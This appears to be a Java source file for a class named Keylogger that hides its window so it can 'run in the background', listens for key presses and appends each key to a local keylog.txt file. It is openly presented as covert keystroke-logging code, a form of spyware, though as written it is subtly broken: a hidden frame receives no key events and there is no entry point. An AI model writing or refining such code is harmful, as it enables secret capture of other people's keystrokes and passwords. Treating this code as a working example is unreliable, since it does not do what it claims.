package UserActivityTracker;  // Adjust the package name as per your project structure

import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import javax.swing.JFrame;

public class Keylogger extends JFrame {

    public Keylogger() {
        setTitle("Keylogger");
        setSize(400, 300);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setVisible(false);  // Hide the window to run in the background

        // Add a key listener to track key presses
        addKeyListener(new KeyAdapter() {
            public void keyPressed(KeyEvent e) {
                String keyPressed = KeyEvent.getKeyText(e.getKeyCode());
                System.out.println("Key pressed: " + keyPressed);
                logKeyToFile(keyPressed);
            }
        });
    }

    // Method to log key presses to a file
    private void logKeyToFile(String key) {
        try (PrintWriter out = new PrintWriter(new FileWriter("keylog.txt", true))) {
            out.println(key);  // Append the key press to the file
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
